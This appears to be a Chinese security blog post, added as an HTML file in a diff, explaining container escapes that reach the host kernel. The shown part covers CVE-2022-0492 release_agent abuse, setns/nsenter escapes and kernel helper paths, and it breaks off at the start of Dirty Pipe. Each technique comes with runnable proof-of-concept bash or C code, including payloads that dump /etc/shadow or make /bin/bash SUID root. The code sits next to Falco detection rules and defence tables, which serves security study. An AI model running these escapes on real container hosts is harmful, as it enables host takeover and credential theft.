@@ -1,0 +1,1170 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>六种直接对话宿主内核的容器逃逸：从 cgroup release_agent 到页缓存共享的内核级突破 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>六种直接对话宿主内核的容器逃逸：从 cgroup release_agent 到页缓存共享的内核级突破</h1>
+<time>2026-07-28</time>
+<ul>
+<li>技术
+Slug: 六种直接对话宿主内核的容器逃逸-从cgroup-release-agent到页缓存共享的内核级突破</li>
+</ul>
+<hr />
+<h2>免责声明</h2>
+<p>本文档仅供网络安全技术研究与教育目的使用，严禁用于任何未经授权的系统访问或攻击活动。文中所有技术细节、PoC代码和攻击方法均基于已公开的安全研究与CVE披露，旨在帮助安全从业者理解和防御容器逃逸威胁。</p>
+<hr />
+<h2>引言：容器与虚拟机的根本差异</h2>
+<p>要理解容器逃逸的本质，必须先回到容器与虚拟机在架构层面的根本差异。</p>
+<p>虚拟机（VM）通过 Hypervisor 提供硬件级隔离，每个 VM 拥有独立的内核。而容器并非一个"轻量级虚拟机"——它本质上只是宿主机上一个被 namespaces（命名空间）和 cgroups（控制组）"装扮"过的普通进程。所有容器共享同一个宿主机内核。</p>
+<p>一个更准确的隐喻是：<strong>容器是"戴着不同 VR 头盔的进程"</strong>。Namespaces 决定了进程能"看到"什么（视图隔离），cgroups 决定了进程能用多少资源（配额隔离），但底下那个真实运转的内核（"真实世界"）只有一个，所有容器都在与它对话。</p>
+<div class="highlight"><pre><span></span><code>        ┌──────────────────────────────────────────────────┐
+        │              虚拟机架构（每 VM 独立内核）          │
+        │  ┌─────────┐ ┌─────────┐ ┌─────────┐            │
+        │  │Guest 内核│ │Guest 内核│ │Guest 内核│            │
+        │  └────┬────┘ └────┬────┘ └────┬────┘            │
+        │       │           │           │                   │
+        │  ┌────┴───────────┴───────────┴────┐            │
+        │  │          Hypervisor / VMM        │            │
+        │  └────────────────┬────────────────┘            │
+        │                   │                              │
+        └───────────────────┼──────────────────────────────┘
+                            │
+                         硬件 CPU
+
+        ┌──────────────────────────────────────────────────┐
+        │       容器架构（共享宿主内核，仅视图隔离）          │
+        │  ┌─────────┐ ┌─────────┐ ┌─────────┐            │
+        │  │  容器 A  │ │  容器 B  │ │  容器 C  │  ← 进程   │
+        │  │NS+Cgroup│ │NS+Cgroup│ │NS+Cgroup│    &quot;VR头盔&quot; │
+        │  └────┬────┘ └────┬────┘ └────┬────┘            │
+        │       └───────────┼───────────┘                  │
+        │              ┌────┴────┐                          │
+        │              │宿主机内核│  ← 唯一真实世界           │
+        │              └────┬────┘                          │
+        └───────────────────┼──────────────────────────────┘
+                            │
+                         硬件 CPU
+</code></pre></div>
+
+<p>正是这种"共享内核"的设计，使得容器逃逸的攻击面与虚拟机逃逸截然不同。虚拟机逃逸需要攻破 Hypervisor（极难），而容器逃逸只要找到内核中"不尊重命名空间边界"的代码路径即可。</p>
+<p>按根因与攻击难度，容器逃逸可分为三个层次：</p>
+<table>
+<thead>
+<tr>
+<th>层次</th>
+<th>描述</th>
+<th>占比（经验估计）</th>
+<th>典型代表</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>第一层：配置不当</td>
+<td>特权容器、危险挂载、过度 capabilities</td>
+<td>90%+</td>
+<td><code>--privileged</code>、<code>hostPID</code>、挂载 <code>/</code></td>
+</tr>
+<tr>
+<td>第二层：隔离机制设计假设被打破</td>
+<td>内核 helper、页缓存、copy-up 等未考虑 NS 隔离</td>
+<td>~8%</td>
+<td>cgroup release_agent、Dirty Pipe、OverlayFS</td>
+</tr>
+<tr>
+<td>第三层：纯内核漏洞</td>
+<td>内核内存破坏类 0day</td>
+<td>~2%</td>
+<td>各类 UAF/堆溢出</td>
+</tr>
+</tbody>
+</table>
+<p>第一层是"运维失误"，第二层是"内核设计缺陷"——本文聚焦的正是第二层与第一层的交界地带：<strong>六种直接与宿主内核对话的逃逸技术</strong>。它们之所以危险，是因为攻击者并不需要打内核内存破坏漏洞，而是利用内核自身提供的、本应"只给宿主 root 用"的合法机制，而这些机制压根不感知容器的命名空间边界。</p>
+<hr />
+<h2>技术一：Cgroup release_agent 利用（CVE-2022-0492）</h2>
+<h3>原理</h3>
+<p>Cgroup v1 提供了一个 <code>release_agent</code> 机制：当某个 cgroup 中最后一个进程退出时，内核会调用该 cgroup 配置的 <code>release_agent</code> 脚本。关键问题在于——<strong>这个脚本是以 root 身份、在宿主机初始命名空间（initial namespace）中执行的</strong>，相当于直接以宿主机 root 身份运行任意命令。</p>
+<p><code>release_agent</code> 的初衷是做资源清理（比如回收 cgroup 目录），但它本质上是宿主机的一个"以 root 主动执行任意路径脚本"的钩子，与容器隔离毫无关系。</p>
+<div class="highlight"><pre><span></span><code>   容器内进程退出 cgroup
+            │
+            ▼
+   内核检测 cgroup 为空（notify_on_release=1）
+            │
+            ▼
+   内核以 init_ns root 身份调用 release_agent 路径
+            │
+            ▼
+   ★ 在宿主机初始命名空间执行 ★（不受容器 NS 约束）
+</code></pre></div>
+
+<h3>漏洞根因</h3>
+<p>正常情况下，设置 <code>release_agent</code> 需要 <code>CAP_SYS_ADMIN</code> 权限。但 CVE-2022-0492 的根因在于：内核 <code>cgroup_release_agent_write()</code> 函数在检查权限时，使用的是 <code>ns_capable()</code> 而非 <code>ns_capable(..., &amp;init_user_ns)</code>。</p>
+<p><code>ns_capable()</code> 默认针对当前进程所在的 user namespace 进行检查。这意味着，一个普通容器进程只要能通过 <code>unshare -Ur</code> 创建一个新的 user namespace，就能在该新 userns 内获得 <code>CAP_SYS_ADMIN</code>（user namespace 的特性：在新 userns 内自动拥有全部 capabilities），从而满足检查，进而设置 <code>release_agent</code>。</p>
+<p>补丁（内核 5.17 合入）将检查改为 <code>ns_capable(..., &amp;init_user_ns)</code>，强制要求权限来自初始用户命名空间。</p>
+<h3>PoC 代码</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="c1"># CVE-2022-0492 cgroup v1 release_agent 逃逸 PoC</span>
+<span class="c1"># 前提：容器允许 user namespace（未禁用 unshare -Ur）</span>
+
+<span class="c1"># 1. 创建新的 user + mount + cgroup namespace，在其中获得 CAP_SYS_ADMIN</span>
+unshare<span class="w"> </span>-urmc<span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;</span>
+<span class="s1">  # 2. 挂载一个 cgroup v1 子系统</span>
+<span class="s1">  mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp</span>
+<span class="s1">  mkdir /tmp/cgrp/x</span>
+
+<span class="s1">  # 3. 开启 notify_on_release</span>
+<span class="s1">  echo 1 &gt; /tmp/cgrp/x/notify_on_release</span>
+
+<span class="s1">  # 4. 获取容器在宿主机上的真实路径（overlay upperdir）</span>
+<span class="s1">  host_path=$(sed -n &quot;s/.*\perdir=\([^,]*\).*/\1/p&quot; /etc/mtab)</span>
+
+<span class="s1">  # 5. 将 release_agent 指向宿主机路径下的 payload</span>
+<span class="s1">  echo &quot;$host_path/cmd&quot; &gt; /tmp/cgrp/x/release_agent</span>
+<span class="s1">&#39;</span>
+
+<span class="c1"># 6. 在容器内写入 payload（对应宿主机 upperdir 路径）</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/cmd<span class="w"> </span><span class="s">&lt;&lt;EOF</span>
+<span class="s">#!/bin/sh</span>
+<span class="s">cat /root/flag.txt &gt; /output 2&gt;&amp;1</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span>/cmd
+
+<span class="c1"># 7. 触发：让一个进程进入该 cgroup 然后退出</span>
+sh<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs &amp;&amp; sleep 1&quot;</span>
+</code></pre></div>
+
+<h3>检测</h3>
+<p>Falco 规则示例：</p>
+<div class="highlight"><pre><span></span><code><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Cgroup release_agent Modified in Container</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测容器内修改 cgroup release_agent，疑似 CVE-2022-0492 逃逸</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">container.id != host and</span>
+<span class="w">    </span><span class="no">(open_write and fd.name contains &quot;release_agent&quot;)</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Suspicious release_agent write (user=%user.name</span>
+<span class="w">    </span><span class="no">container=%container.id image=%container.image.repository</span>
+<span class="w">    </span><span class="no">file=%fd.name command=%proc.cmdline)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">WARNING</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">container</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">escape</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">mitre_privilege_escalation</span><span class="p p-Indicator">]</span>
+</code></pre></div>
+
+<h3>防御</h3>
+<table>
+<thead>
+<tr>
+<th>防御措施</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>升级内核至 5.17+</td>
+<td>修复权限检查，强制要求 init_user_ns 的 CAP_SYS_ADMIN</td>
+</tr>
+<tr>
+<td>迁移至 cgroup v2</td>
+<td>v2 的 release_agent 机制被移除/收紧</td>
+</tr>
+<tr>
+<td>seccomp 阻止 mount</td>
+<td>在 seccomp profile 中禁止 <code>mount</code> 系统调用</td>
+</tr>
+<tr>
+<td>禁用 user namespace</td>
+<td>设置 <code>user.max_user_namespaces=0</code>，阻断 unshare -Ur</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>技术二：Namespace 切换 / Unshare 逃逸</h2>
+<h3>原理</h3>
+<p>Namespace 是容器隔离的基石，但它并非单向"关押"——进程可以主动通过系统调用加入其他 namespace。<code>setns()</code> 系统调用允许一个进程通过一个指向 <code>/proc/&lt;pid&gt;/ns/&lt;type&gt;</code> 的文件描述符，把自己"切换"到目标进程所在的命名空间。这正是 <code>nsenter</code> 工具的底层实现。</p>
+<p>如果容器能访问到宿主机进程的 namespace fd（例如特权容器 + <code>hostPID</code>），那么容器进程可以直接 setns 进入宿主机 PID/mount/net 等命名空间，从而"逃出"容器。</p>
+<h3>三个关键系统调用</h3>
+<table>
+<thead>
+<tr>
+<th>系统调用</th>
+<th>作用</th>
+<th>是否创建新进程</th>
+<th>典型场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>clone()</code></td>
+<td>创建新进程并可同时进入新的命名空间</td>
+<td>是（新进程）</td>
+<td>fork 出隔离子进程</td>
+</tr>
+<tr>
+<td><code>unshare()</code></td>
+<td>将当前进程移入新创建的命名空间</td>
+<td>否（修改自身）</td>
+<td>容器 runtime 自隔离</td>
+</tr>
+<tr>
+<td><code>setns()</code></td>
+<td>将当前进程加入一个已存在的命名空间（通过 fd）</td>
+<td>否（修改自身）</td>
+<td>nsenter、调试、逃逸</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code>   setns() 工作流：
+   ┌──────────────┐         fd = open(&quot;/proc/1/ns/mnt&quot;)
+   │  容器进程     │ ────────────────────────────────────┐
+   │  (在容器NS)   │                                       │
+   └──────┬───────┘                                       ▼
+          │ setns(fd, CLONE_NEWNS)            ┌─────────────────┐
+          │ ─────────────────────────────────►│ 宿主机 PID 1 的  │
+          │                                    │ mount namespace │
+          ▼                                    └─────────────────┘
+   ┌──────────────┐
+   │  容器进程     │  ← 现在视图切换到宿主机 mount NS
+   │ (在宿主NS)   │     可访问宿主机文件系统
+   └──────────────┘
+</code></pre></div>
+
+<h3>PoC：三种场景</h3>
+<p><strong>场景 A：特权容器 + hostPID</strong></p>
+<p>最简单。容器拥有宿主机 PID 命名空间，可直接看到并操作 PID 1：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 容器以 --privileged --pid=host 启动</span>
+nsenter<span class="w"> </span>-t<span class="w"> </span><span class="m">1</span><span class="w"> </span>-m<span class="w"> </span>-u<span class="w"> </span>-i<span class="w"> </span>-n<span class="w"> </span>--<span class="w"> </span>/bin/sh
+<span class="c1"># 直接获得宿主机 shell</span>
+</code></pre></div>
+
+<p><strong>场景 B：CAP_SYS_ADMIN + unshare</strong></p>
+<p>容器拥有 <code>CAP_SYS_ADMIN</code>，可 unshare 新命名空间后挂载宿主机文件系统：</p>
+<div class="highlight"><pre><span></span><code>unshare<span class="w"> </span>-m<span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;</span>
+<span class="s1">  mkdir /tmp/host</span>
+<span class="s1">  mount /dev/sda1 /tmp/host     # 挂载宿主根分区</span>
+<span class="s1">  chroot /tmp/host /bin/sh</span>
+<span class="s1">&#39;</span>
+</code></pre></div>
+
+<p><strong>场景 C：通过 /proc/pid/root 符号链接</strong></p>
+<p>即使没有 hostPID，若挂载了宿主机 <code>/proc</code> 或可访问某宿主进程的 <code>/proc/&lt;pid&gt;/root</code>：</p>
+<div class="highlight"><pre><span></span><code>ls<span class="w"> </span>-la<span class="w"> </span>/proc/1/root<span class="w">        </span><span class="c1"># -&gt; 指向宿主机根目录</span>
+chroot<span class="w"> </span>/proc/1/root<span class="w"> </span>/bin/sh
+</code></pre></div>
+
+<h3>C 代码示例</h3>
+<div class="highlight"><pre><span></span><code><span class="cp">#define _GNU_SOURCE</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;fcntl.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sched.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">target_pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">  </span><span class="c1">// 宿主机 init 进程</span>
+
+<span class="w">    </span><span class="c1">// 1. 打开目标进程各命名空间的 fd</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">ns_path</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<span class="w">    </span><span class="n">snprintf</span><span class="p">(</span><span class="n">ns_path</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">ns_path</span><span class="p">),</span><span class="w"> </span><span class="s">&quot;/proc/%d/ns/mnt&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">target_pid</span><span class="p">);</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">mnt_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="n">ns_path</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDONLY</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">snprintf</span><span class="p">(</span><span class="n">ns_path</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">ns_path</span><span class="p">),</span><span class="w"> </span><span class="s">&quot;/proc/%d/ns/pid&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">target_pid</span><span class="p">);</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">pid_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="n">ns_path</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDONLY</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">snprintf</span><span class="p">(</span><span class="n">ns_path</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">ns_path</span><span class="p">),</span><span class="w"> </span><span class="s">&quot;/proc/%d/ns/net&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">target_pid</span><span class="p">);</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">net_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="n">ns_path</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDONLY</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 2. 依次 setns 加入宿主机命名空间</span>
+<span class="w">    </span><span class="n">setns</span><span class="p">(</span><span class="n">mnt_fd</span><span class="p">,</span><span class="w"> </span><span class="n">CLONE_NEWNS</span><span class="p">);</span>
+<span class="w">    </span><span class="n">setns</span><span class="p">(</span><span class="n">pid_fd</span><span class="p">,</span><span class="w">  </span><span class="n">CLONE_NEWPID</span><span class="p">);</span>
+<span class="w">    </span><span class="n">setns</span><span class="p">(</span><span class="n">net_fd</span><span class="p">,</span><span class="w">  </span><span class="n">CLONE_NEWNET</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 3. 切换根目录并执行宿主机 shell</span>
+<span class="w">    </span><span class="n">chdir</span><span class="p">(</span><span class="s">&quot;/proc/1/root&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">chroot</span><span class="p">(</span><span class="s">&quot;/proc/1/root&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>检测</h3>
+<div class="highlight"><pre><span></span><code><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Namespace Enter From Container</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测容器内执行 nsenter/unshare，疑似命名空间逃逸</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">container.id != host and</span>
+<span class="w">    </span><span class="no">(proc.name in (nsenter, unshare) or</span>
+<span class="w">     </span><span class="no">spawned_process and proc.args contains &quot;/proc/&quot;)</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Namespace manipulation in container</span>
+<span class="w">    </span><span class="no">(user=%user.name container=%container.id</span>
+<span class="w">    </span><span class="no">proc=%proc.name args=%proc.cmdline)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CRITICAL</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">container</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">escape</span><span class="p p-Indicator">]</span>
+</code></pre></div>
+
+<h3>防御</h3>
+<table>
+<thead>
+<tr>
+<th>防御措施</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>禁止 hostPID / hostIPC / hostNetwork</td>
+<td>切断容器访问宿主进程的 namespace fd</td>
+</tr>
+<tr>
+<td>限制 user namespace</td>
+<td><code>user.max_user_namespaces=0</code></td>
+</tr>
+<tr>
+<td>seccomp 阻止 setns/unshare</td>
+<td>在 seccomp profile 中 deny 这两个系统调用</td>
+</tr>
+<tr>
+<td>避免特权容器</td>
+<td>杜绝 <code>--privileged</code>，按需授予单个 capability</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>技术三：procfs/sysfs 滥用</h2>
+<h3>原理</h3>
+<p>Linux 内核提供了一系列 "helper" 机制：当某些内核事件发生时，内核会主动调用用户空间配置的某个程序路径。这些 helper 的设计早于容器化时代，<strong>它们完全不受命名空间隔离约束</strong>，且执行身份为宿主机 root（pid 1 上下文）。</p>
+<p>这意味着：只要容器能写这些 <code>/proc/sys/...</code> 或 <code>/sys/...</code> 路径，就等于获得了一个宿主机 root 命令执行钩子。</p>
+<h3>三个高危路径</h3>
+<table>
+<thead>
+<tr>
+<th>路径</th>
+<th>触发时机</th>
+<th>执行身份</th>
+<th>危险性</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/proc/sys/kernel/core_pattern</code></td>
+<td>进程崩溃产生 core dump</td>
+<td>宿主 root，在崩溃进程的 cwd</td>
+<td>极高</td>
+</tr>
+<tr>
+<td><code>/proc/sys/kernel/modprobe_path</code></td>
+<td>内核请求加载模块</td>
+<td>宿主 root</td>
+<td>极高</td>
+</tr>
+<tr>
+<td><code>/sys/kernel/uevent_helper</code></td>
+<td>设备热插拔事件</td>
+<td>宿主 root</td>
+<td>高</td>
+</tr>
+</tbody>
+</table>
+<h3>PoC：core_pattern 逃逸</h3>
+<p><code>core_pattern</code> 以 <code>|</code> 开头时，内核会将崩溃进程的 core dump 通过管道传给指定程序，<strong>该程序以宿主机 root 身份执行</strong>。</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="c1"># core_pattern 逃逸 PoC（需要容器能写 /proc/sys/kernel/core_pattern）</span>
+
+<span class="c1"># 1. 获取容器在宿主机的真实路径</span>
+<span class="nv">host_path</span><span class="o">=</span><span class="k">$(</span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;s/.*\perdir=\([^,]*\).*/\1/p&quot;</span><span class="w"> </span>/etc/mtab<span class="k">)</span>
+
+<span class="c1"># 2. 准备 payload，输出到容器内可见路径</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/cmd<span class="w"> </span><span class="s">&lt;&lt;EOF</span>
+<span class="s">#!/bin/sh</span>
+<span class="s">id &gt; $host_path/output</span>
+<span class="s">cat /etc/shadow &gt;&gt; $host_path/output</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span>/cmd
+
+<span class="c1"># 3. 将 core_pattern 指向 payload（| 表示管道执行）</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;|</span><span class="nv">$host_path</span><span class="s2">/cmd&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/proc/sys/kernel/core_pattern
+
+<span class="c1"># 4. 触发一个进程崩溃，内核将以 root 调用 /cmd</span>
+sleep<span class="w"> </span><span class="m">1000</span><span class="w"> </span><span class="p">&amp;</span>
+<span class="nb">kill</span><span class="w"> </span>-SIGSEGV<span class="w"> </span>%1
+<span class="nb">wait</span>
+
+<span class="c1"># 5. 读取结果</span>
+cat<span class="w"> </span>/output
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>   触发流程：
+   ┌─────────────┐    SIGSEGV     ┌──────────────┐
+   │ sleep 1000  │ ─────────────► │  内核收到崩溃  │
+   └─────────────┘                └──────┬───────┘
+                                         │ 查 core_pattern
+                                         ▼
+                              ┌────────────────────┐
+                              │ |&lt;host_path&gt;/cmd    │
+                              └─────────┬──────────┘
+                                         │ 以宿主 root 执行
+                                         ▼
+                              ┌────────────────────┐
+                              │ /cmd 在宿主 NS 运行 │
+                              │ → 写出 shadow       │
+                              └────────────────────┘
+</code></pre></div>
+
+<h3>PoC：modprobe_path 滥用</h3>
+<p><code>modprobe_path</code> 在内核需要加载未知模块时被调用，例如执行一个未知二进制格式：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 1. 获取宿主路径并准备 payload</span>
+<span class="nv">host_path</span><span class="o">=</span><span class="k">$(</span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;s/.*\perdir=\([^,]*\).*/\1/p&quot;</span><span class="w"> </span>/etc/mtab<span class="k">)</span>
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;#!/bin/sh\nchmod 4777 /bin/bash&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/cmd
+chmod<span class="w"> </span>+x<span class="w"> </span>/cmd
+
+<span class="c1"># 2. 覆盖 modprobe_path</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$host_path</span><span class="s2">/cmd&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/proc/sys/kernel/modprobe_path
+
+<span class="c1"># 3. 触发：执行一个未知 magic 的二进制</span>
+<span class="c1">#   内核会调用 modprobe_path 指向的程序</span>
+<span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="s1">&#39;\xff\xff\xff\xff&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/unknown
+chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/unknown
+/tmp/unknown<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># 4. 现在 /bin/bash 是 SUID root</span>
+/bin/bash<span class="w"> </span>-p
+</code></pre></div>
+
+<h3>PoC：uevent_helper 滥用</h3>
+<div class="highlight"><pre><span></span><code><span class="nv">host_path</span><span class="o">=</span><span class="k">$(</span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;s/.*\perdir=\([^,]*\).*/\1/p&quot;</span><span class="w"> </span>/etc/mtab<span class="k">)</span>
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;#!/bin/sh\n</span><span class="nv">$host_path</span><span class="s2">/cmd_payload&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/cmd
+chmod<span class="w"> </span>+x<span class="w"> </span>/cmd
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$host_path</span><span class="s2">/cmd&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/sys/kernel/uevent_helper
+<span class="c1"># 触发一个 uevent（如操作 /sys/class/net 设备）</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;change&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/sys/class/net/eth0/uevent
+</code></pre></div>
+
+<h3>检测</h3>
+<div class="highlight"><pre><span></span><code><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Kernel Helper Path Modified in Container</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测容器内修改 core_pattern/modprobe_path/uevent_helper</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">container.id != host and</span>
+<span class="w">    </span><span class="no">open_write and</span>
+<span class="w">    </span><span class="no">(fd.name=/proc/sys/kernel/core_pattern or</span>
+<span class="w">     </span><span class="no">fd.name=/proc/sys/kernel/modprobe_path or</span>
+<span class="w">     </span><span class="no">fd.name=/sys/kernel/uevent_helper)</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Kernel helper path tampering</span>
+<span class="w">    </span><span class="no">(file=%fd.name container=%container.id</span>
+<span class="w">    </span><span class="no">proc=%proc.cmdline user=%user.name)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CRITICAL</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">container</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">escape</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">kernel</span><span class="p p-Indicator">]</span>
+</code></pre></div>
+
+<h3>防御</h3>
+<table>
+<thead>
+<tr>
+<th>防御措施</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/proc</code> 和 <code>/sys</code> 只读挂载</td>
+<td>容器 runtime 默认应只读挂载 procfs/sysfs</td>
+</tr>
+<tr>
+<td>AppArmor/SELinux 屏蔽</td>
+<td>profile 中 deny 写这些危险路径</td>
+</tr>
+<tr>
+<td>禁止特权容器</td>
+<td>写 <code>/proc/sys</code> 需要 CAP_SYS_ADMIN</td>
+</tr>
+<tr>
+<td>内核 hardening</td>
+<td>部分发行版可配置 <code>kernel.modules_disabled=1</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>技术四：页缓存共享攻击（Dirty Pipe, CVE-2022-0847）</h2>
+<h3>原理</h3>
+<p>这是容器逃逸中最"优雅"的一类——它利用的不是命名空间漏洞，而是 Linux 页缓存（page cache）的<strong>全局共享</strong>特性，配合一个内核 bug，实现"以普通权限覆盖只读文件内容"。</p>
